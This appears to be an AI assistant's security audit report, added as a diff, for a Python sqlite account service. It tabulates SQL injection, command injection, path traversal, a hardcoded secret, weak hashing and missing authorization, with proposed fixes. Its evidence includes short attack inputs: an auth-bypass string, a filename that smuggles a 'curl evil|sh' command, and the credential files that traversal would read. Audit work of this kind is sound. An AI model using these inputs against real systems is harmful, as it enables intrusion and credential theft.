@@ -1,0 +1,27 @@
+**Scope:** `/tmp/tmp.FuIrLk7NQF/target/account_service.py` (170 lines, stdlib-only, sqlite3). All findings below were verified by reading the code.
+
+| # | Finding | Evidence | Impact | Priority | Proposed Fix | Risk |
+|---|---------|----------|--------|----------|--------------|------|
+| 1 | **SQL injection** — `username` interpolated into the query with an f-string. Every other query in the file uses `?` binding; this one doesn't. `CONFIRMED` | `account_service.py:34` | Full auth bypass (`' OR '1'='1`), dump/modify `users` incl. `password_hash` | Critical | `conn.execute("... WHERE username = ?", (username,))` | Low — mechanical, same return shape |
+| 2 | **Command injection** — `filename` and `user_id` interpolated into a `shell=True` command string | `account_service.py:119-125` | Arbitrary command execution as the service user via `a.csv; curl evil\|sh` | Critical | Drop `shell=True`, pass an argv list; validate `filename` against `^[A-Za-z0-9_.-]+$` | Low |
+| 3 | **Path traversal / arbitrary file read** — `os.path.join(EXPORT_DIR, filename)` with unvalidated `filename`; an absolute path discards `EXPORT_DIR` entirely, and `../` escapes it. The `open()` at :126 returns the bytes to the caller | `account_service.py:119`, `account_service.py:126-127` | Read any file the process can read (`/etc/passwd`, `.env`, the DB); write outside the export dir | Critical | Reject separators, then `os.path.realpath(dest).startswith(os.path.realpath(EXPORT_DIR) + os.sep)` | Low |
+| 4 | **Hardcoded secret in source** — `SIGNING_KEY` is a live-looking credential committed in the module | `account_service.py:19` | Secret disclosure to anyone with repo/source access; it is also the password salt (#6), so leaking it enables offline cracking | Critical | Load from env/secret manager; rotate the exposed value; re-hash passwords | Medium — rotation invalidates existing hashes, needs a migration path |
+| 5 | **Plaintext password written to logs** on every successful login | `account_service.py:60-65` | Credentials in log files, aggregators, and backups; multiplies the blast radius of any log exposure | Critical | Remove the `password` argument from the log record entirely | Low |
+| 6 | **Weak password hashing** — single-pass SHA-256 with a global static pepper and no per-user salt | `account_service.py:72-75` | Fast GPU cracking; identical passwords yield identical hashes, enabling rainbow/precomputation across the whole user table | High | `hashlib.scrypt` or `argon2`/`bcrypt` with a per-user random salt; migrate on next login | Medium — needs dual-read during migration |
+| 7 | **Missing authorization (IDOR) in `update_profile`** — `session_user_id` is accepted and never compared to `target_user_id` or checked for an admin role | `account_service.py:83-100` | Any authenticated user can rewrite any other account's `email` — a password-reset takeover primitive | High | Mirror the `deactivate_account` check: allow only when actor is admin or `session_user_id == target_user_id` | Low |
+| 8 | **Missing authorization (IDOR) in `get_profile`** — same unused `session_user_id`; returns `email` and `role` for any id | `account_service.py:103-114` | Enumerate all accounts' email and privilege level by iterating ids | High | Same ownership/admin check as #7 | Low |
+| 9 | **Password hash returned to callers** — `find_by_username` selects and returns `password_hash` in the dict; only `verify_credentials` needs it, and any caller that serializes this dict leaks it | `account_service.py:34`, `account_service.py:36` | Hash disclosure in an API response if the dict reaches a serializer | Medium | Pop `password_hash` before returning, or give `verify_credentials` a private hash-only lookup | Low |
+| 10 | **Non-constant-time hash comparison** — `==` on the hash string short-circuits on first differing byte | `account_service.py:59` | Timing side channel on the stored hash; practically hard to exploit remotely, cheap to close | Low | `hmac.compare_digest(...)` | Low |
+| 11 | **Unvalidated email on write** — `update_profile` accepts `email` straight from `fields`; `normalize_email` exists at :147 but is never called on this path | `account_service.py:86`, `account_service.py:147-152` | Malformed or attacker-chosen addresses stored; feeds downstream mail/reset flows | Low | Run `normalize_email` on `updates["email"]` and reject `None` | Low |
+
+### Notes on what is *not* a finding
+
+- `find_by_id`, `list_recent_signups`, `deactivate_account`, and the `UPDATE` at :93 use parameter binding correctly. The f-string at :90 builds only column names, and those are constrained by the `allowed` set at :85 — not injectable.
+- `deactivate_account` (:160) has the authorization check that #7 and #8 are missing; it's the correct pattern to copy.
+- `datetime.utcnow()` (:64, :80, :134) is deprecated in 3.12+ and returns a naive datetime — a correctness/comparison hazard against any tz-aware `issued_at`, not a security issue. Out of scope, flagging only.
+
+### Suggested fix order
+
+#1–#5 are independently exploitable and should land first; #2 and #3 are both in `export_account_data` and are fixed by the same rewrite. #4 and #6 are coupled — rotating `SIGNING_KEY` and moving off SHA-256 should be one migration, not two. #7 and #8 are the same missing check in two functions.
+
+I have not changed any code. Tests: **NOT RUN** — no test files are present for this module. Say the word and I'll implement any subset, starting with the critical five.
